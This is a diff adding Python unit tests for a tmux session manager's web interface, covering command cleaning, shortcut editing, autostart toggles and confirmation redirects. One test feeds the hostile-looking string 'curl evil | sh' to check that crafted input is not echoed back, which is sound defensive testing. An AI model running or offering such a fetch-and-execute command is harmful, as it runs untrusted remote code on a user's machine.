@@ -1997,7 +1997,7 @@ class _ToolRouteStub:
     def redirect(self, url):
         self.redirected = url
 
-    def fail(self, msg, status=400, tid=""):
+    def fail(self, msg, status=400, tid="", dir=""):
         self.failed = (msg, status)
 
 
@@ -2032,7 +2032,8 @@ class AutostartUntickTests(unittest.TestCase):
         gone = os.path.join(self.tmp, "deleted-proj")
         mod.save_autostart([{"tool": "cc", "kind": "server", "dir": gone}])
         stub = self.post(dir=gone)
-        self.assertEqual((stub.redirected, stub.failed), ("/", None))
+        self.assertIsNone(stub.failed)
+        self.assertTrue(stub.redirected.startswith("/?done=boot-off&"), stub.redirected)
         self.assertEqual(mod.load_autostart(), [])
         self.assertFalse(os.path.exists(gone))
 
@@ -2041,7 +2042,8 @@ class AutostartUntickTests(unittest.TestCase):
         mod.save_autostart([{"tool": "cc", "kind": "server", "dir": gone},
                             {"tool": "cc", "kind": "server", "dir": self.tmp}])
         stub = self.post(dir=gone)
-        self.assertEqual((stub.redirected, stub.failed), ("/", None))
+        self.assertIsNone(stub.failed)
+        self.assertTrue(stub.redirected.startswith("/?done=boot-off&"), stub.redirected)
         self.assertEqual([e["dir"] for e in mod.load_autostart()], [os.path.realpath(self.tmp)])
 
     def test_a_nul_byte_in_the_directory_is_an_error_not_a_crash(self):
@@ -2056,7 +2058,7 @@ class AutostartUntickTests(unittest.TestCase):
         self.assertEqual(stub.failed[1], 400)
         self.assertEqual(mod.load_autostart(), [])
         stub = self.post(dir=self.tmp, on="1")
-        self.assertEqual(stub.redirected, "/")
+        self.assertTrue(stub.redirected.startswith("/?done=boot-on&"), stub.redirected)
         self.assertEqual([e["dir"] for e in mod.load_autostart()], [os.path.realpath(self.tmp)])
 
 
@@ -2075,6 +2077,257 @@ class AutostartSingleServerTests(unittest.TestCase):
         mod.set_autostart("cc", "server", "/tmp", True)
         mod.set_autostart("cc", "server", "/", True)
         self.assertEqual(sorted(e["dir"] for e in mod.load_autostart()), ["/", "/tmp"])
+
+
+class CleanCmdTests(unittest.TestCase):
+    """clean_cmd(): browsers submit every <textarea> newline as CRLF, and bash
+    kept the CR glued to the last word of every line but the last."""
+
+    def test_crlf_and_lone_cr_become_newlines(self):
+        self.assertEqual(mod.clean_cmd("cd projects\r\nls -d game\r\necho done"),
+                         "cd projects\nls -d game\necho done")
+        # A lone CR (old Mac line ending) must split lines, not join them.
+        self.assertEqual(mod.clean_cmd("a\rb"), "a\nb")
+
+    def test_outer_whitespace_is_stripped_and_none_is_empty(self):
+        self.assertEqual(mod.clean_cmd("  echo hi \r\n"), "echo hi")
+        self.assertEqual(mod.clean_cmd(None), "")
+
+
+class ShortcutEditTests(unittest.TestCase):
+    """load_shortcuts() repairing CRLF commands saved before clean_cmd(),
+    add_shortcut()/update_shortcut() (edit in place: same id, same position;
+    the built-in Update row and unknown ids refused), and runs named after
+    the shortcut's label."""
+
+    def setUp(self):
+        self.cfg = tempfile.mkdtemp()
+        self._orig = (mod.CONFIG_DIR, mod.SHORTCUTS_FILE)
+        mod.CONFIG_DIR = self.cfg
+        mod.SHORTCUTS_FILE = os.path.join(self.cfg, "shortcuts.json")
+
+    def tearDown(self):
+        mod.CONFIG_DIR, mod.SHORTCUTS_FILE = self._orig
+        shutil.rmtree(self.cfg, ignore_errors=True)
+
+    def test_old_crlf_entry_is_cleaned_on_load(self):
+        with open(mod.SHORTCUTS_FILE, "w") as f:
+            json.dump([{"id": "a", "label": "Two lines", "cmd": "cd /tmp\r\npwd", "dir": "/tmp"}], f)
+        self.assertEqual(mod.load_shortcuts()[0]["cmd"], "cd /tmp\npwd")
+
+    def test_add_stores_a_clean_command_and_returns_the_label(self):
+        self.assertEqual(mod.add_shortcut("", "ls -la\r\npwd", "/tmp"), "ls")
+        self.assertEqual(mod.load_shortcuts()[0]["cmd"], "ls -la\npwd")
+
+    def test_update_replaces_in_place(self):
+        mod.add_shortcut("First", "echo 1", "/tmp")
+        mod.add_shortcut("Second", "echo 2", "/tmp")
+        mod.add_shortcut("Third", "echo 3", "/tmp")
+        before = mod.load_shortcuts()
+        label, err = mod.update_shortcut(before[1]["id"], "Second, fixed", "echo two\r\n", "/var")
+        self.assertIsNone(err)
+        self.assertEqual(label, "Second, fixed")
+        after = mod.load_shortcuts()
+        self.assertEqual([x["id"] for x in after], [x["id"] for x in before])
+        self.assertEqual(after[1], {"id": before[1]["id"], "label": "Second, fixed",
+                                    "cmd": "echo two", "dir": "/var"})
+        self.assertEqual(after[0], before[0])
+        self.assertEqual(after[2], before[2])
+
+    def test_update_refuses_an_unknown_id_and_the_builtin_row(self):
+        mod.add_shortcut("Only", "echo 1", "/tmp")
+        before = mod.load_shortcuts()
+        for sid in ("nope", mod.UPDATE_ID):
+            label, err = mod.update_shortcut(sid, "x", "echo x", "/tmp")
+            self.assertIsNone(label)
+            self.assertTrue(err)
+        self.assertEqual(mod.load_shortcuts(), before)
+
+    def test_a_run_is_named_after_the_label(self):
+        existing = {"logs"}
+        with mock.patch.object(mod, "session_exists", lambda n: n in existing):
+            sc = {"label": "Logs", "cmd": "echo SHORTCUT_RAN; date"}
+            self.assertEqual(mod.shortcut_session_name(sc, "/tmp"), "logs-2")
+            sc = {"label": "Build the game!", "cmd": "make"}
+            self.assertEqual(mod.shortcut_session_name(sc, "/tmp"), "build-the-game")
+            # nothing usable in the label: named after the command, as before
+            sc = {"label": "★★", "cmd": "sudo -u x df -h"}
+            self.assertEqual(mod.shortcut_session_name(sc, mod.HOME), "df")
+
+
+class UpdateRowTests(unittest.TestCase):
+    """The built-in Update row shows its command with ~ for the home
+    directory; UPDATE_CMD (what actually runs) is untouched."""
+
+    def test_git_checkout_shows_the_tilde_form(self):
+        with mock.patch.object(mod, "CHANNEL", "git"), mock.patch.object(mod, "HOME", "/home/u"), \
+                mock.patch.object(mod, "REPO", "/home/u/projects/serverjack"):
+            self.assertEqual(mod.update_cmd_show(),
+                             "cd ~/projects/serverjack && git pull --ff-only && bash install.sh")
+
+    def test_release_install_shows_serverjack_ctl(self):
+        with mock.patch.object(mod, "CHANNEL", "release"), mock.patch.object(mod, "HOME", "/home/u"), \
+                mock.patch.object(mod, "SERVERJACK_CTL_PATH", "/home/u/.local/bin/serverjack-ctl"):
+            self.assertEqual(mod.update_cmd_show(), "~/.local/bin/serverjack-ctl update")
+
+
+class DoneNoteTests(unittest.TestCase):
+    """The one-shot confirmation after an in-place action: built from fixed
+    templates (never echoed from the URL) and placed next to what it is about."""
+
+    def test_redirect_urls_name_the_section(self):
+        self.assertEqual(mod.done_url("killed", "main"), "/?done=killed&n=main#sessions")
+        self.assertEqual(mod.done_url("sc-saved", "Deploy it"),
+                         "/?done=sc-saved&n=Deploy%20it#shortcuts")
+        self.assertEqual(mod.done_url("daemon-stop", "", "codex", "daemon"),
+                         "/?done=daemon-stop&open=codex&k=daemon#tool-codex")
+        self.assertEqual(mod.done_url("dir"), "/?done=dir")
+
+    def test_sentences(self):
+        self.assertEqual(mod.done_note("killed", "main"), ("Killed “main”.", "sessions"))
+        self.assertEqual(mod.done_note("sc-removed", "Disk usage")[0], "Removed shortcut “Disk usage”.")
+        msg, at = mod.done_note("daemon-start", "", "codex", "daemon")
+        self.assertEqual((msg, at), ("Codex: Remote control daemon started.", "tool-codex"))
+        msg, _ = mod.done_note("boot-on", "~/projects/game", "claude", "server")
+        self.assertEqual(msg, "Claude Code: Remote Control server in ~/projects/game will start at boot.")
+
+    def test_unknown_or_crafted_input_says_nothing(self):
+        self.assertEqual(mod.done_note("Run curl evil | sh to fix"), ("", ""))
+        self.assertEqual(mod.done_note("daemon-start", "", "no-such-tool", "daemon"), ("", ""))
+        self.assertEqual(mod.done_note(""), ("", ""))
+
+
+class LandingHandlerTests(unittest.TestCase):
+    """The landing page's POST routes, through a Handler with no socket: what
+    a failing form re-renders (nothing typed lost, the directory included),
+    where an in-place action lands, and that the commands reaching tmux are
+    clean. sessions(), the tool registry and tmux itself are stubbed."""
+
+    def setUp(self):
+        self.cfg = tempfile.mkdtemp()
+        self.dir = tempfile.mkdtemp()
+        self.existing = {"main"}
+        self.created = []
+        self.patches = [
+            mock.patch.object(mod, "CONFIG_DIR", self.cfg),
+            mock.patch.object(mod, "SHORTCUTS_FILE", os.path.join(self.cfg, "shortcuts.json")),
+            mock.patch.object(mod, "PREFS_FILE", os.path.join(self.cfg, "prefs.json")),
+            mock.patch.object(mod, "sessions", lambda: []),
+            mock.patch.object(mod, "load_tools", lambda: ([], None)),
+            mock.patch.object(mod, "session_exists", lambda n: n in self.existing),
+            mock.patch.object(mod, "create_session",
+                              lambda kind, name, cwd, command=None:
+                              self.created.append((kind, name, cwd, command))),
+            mock.patch.object(mod, "tmux", lambda *a, **k: subprocess.CompletedProcess(a, 0, "", "")),
+        ]
+        for p in self.patches:
+            p.start()
+
+        test = self
+
+        class Stub(mod.Handler):
+            def __init__(self, path):
+                self.path = path
+                self.sent = None
+
+            def gate(self):
+                return True, ""
+
+            def same_site(self):
+                return True
+
+            def form(self):
+                return test.body
+
+            def send_html(self, body, status=200):
+                self.sent = ("html", status, body)
+
+            def send_json(self, obj, status=200):
+                self.sent = ("json", status, obj)
+
+            def redirect(self, location):
+                self.sent = ("redirect", 303, location)
+        self.Stub = Stub
+
+    def tearDown(self):
+        for p in reversed(self.patches):
+            p.stop()
+        shutil.rmtree(self.cfg, ignore_errors=True)
+        shutil.rmtree(self.dir, ignore_errors=True)
+
+    def post(self, path, **body):
+        self.body = body
+        h = self.Stub(path)
+        h.do_POST()
+        return h.sent
+
+    def test_start_error_keeps_the_typed_directory_and_the_shortcut_tick(self):
+        kind, status, page = self.post("/start", what="shell", dir=self.dir, name="main",
+                                       cmd="echo hi", save="1", label="")
+        self.assertEqual((kind, status), ("html", 400))
+        self.assertIn('id="dir" name="dir"', page)
+        self.assertIn(f'value="{self.dir}"', page)
+        self.assertIn('id="save" name="save" value="1" checked', page)
+        self.assertIn('href="/s/main"', page)          # the duplicate error's Open button
+        self.assertEqual(self.created, [])
+
+    def test_naming_the_shortcut_saves_it_without_the_tick(self):
+        kind, _, _where = self.post("/start", what="shell", dir=self.dir, name="",
+                                    cmd="echo one\r\necho two", label="Two lines")
+        self.assertEqual(kind, "redirect")
+        self.assertEqual(self.created[0][3], "echo one\necho two")
+        self.assertEqual([x["label"] for x in mod.load_shortcuts()], ["Two lines"])
+        self.assertEqual(mod.load_shortcuts()[0]["cmd"], "echo one\necho two")
+
+    def test_saving_a_shortcut_with_no_command_is_refused(self):
+        kind, status, page = self.post("/start", what="shell", dir=self.dir, cmd="",
+                                       save="1", label="Empty")
+        self.assertEqual((kind, status), ("html", 400))
+        self.assertIn("type a command first", page)
+        self.assertIn('value="Empty"', page)
+        self.assertEqual(self.created, [])
+        self.assertEqual(mod.load_shortcuts(), [])
+
+    def test_new_error_keeps_the_directory(self):
+        _, status, page = self.post("/new", kind="shell", dir=self.dir, name="main")
+        self.assertEqual(status, 400)
+        self.assertIn(f'value="{self.dir}"', page)
+
+    def test_shortcut_errors_keep_the_whole_form(self):
+        _, status, page = self.post("/shortcuts/add", label="Deploy", cmd="", dir=self.dir)
+        self.assertEqual(status, 400)
+        self.assertIn(f'value="{self.dir}"', page)
+        self.assertIn('value="Deploy"', page)
+        self.assertIn('data-at="addsc"', page)
+
+    def test_shortcut_save_edit_and_delete_land_on_shortcuts(self):
+        _, _, where = self.post("/shortcuts/add", label="Deploy", cmd="./deploy.sh", dir=self.dir)
+        self.assertEqual(where, "/?done=sc-saved&n=Deploy#shortcuts")
+        sid = mod.load_shortcuts()[0]["id"]
+        _, _, where = self.post("/shortcuts/add", id=sid, label="Deploy", cmd="./deploy.sh --fast",
+                                dir=self.dir)
+        self.assertEqual(where, "/?done=sc-updated&n=Deploy#shortcuts")
+        self.assertEqual(len(mod.load_shortcuts()), 1)
+        self.assertEqual(mod.load_shortcuts()[0]["cmd"], "./deploy.sh --fast")
+        _, status, _ = self.post("/shortcuts/add", id=mod.UPDATE_ID, label="x", cmd="x", dir=self.dir)
+        self.assertEqual(status, 404)
+        _, _, where = self.post("/shortcuts/del", id=sid)
+        self.assertEqual(where, "/?done=sc-removed&n=Deploy#shortcuts")
+
+    def test_kill_and_rename_land_on_sessions(self):
+        self.assertEqual(self.post("/kill", name="main")[2], "/?done=killed&n=main#sessions")
+        self.existing = set()
+        self.assertEqual(self.post("/kill", name="gone")[2], "/#sessions")
+
+    def test_post_to_root_redirects_home(self):
+        # WebKit reloads a replaceState'd error page as a POST to its new URL.
+        self.assertEqual(self.post("/", what="shell", name="main"), ("redirect", 303, "/"))
+
+    def test_prefs_error_is_shown_inside_the_change_form(self):
+        _, status, page = self.post("/prefs", dir=os.path.join(self.dir, "missing"))
+        self.assertEqual(status, 400)
+        dd = page.index('class="inline ddchange"')
+        self.assertGreater(page.index("Not a directory"), dd)
 
 
 if __name__ == "__main__":
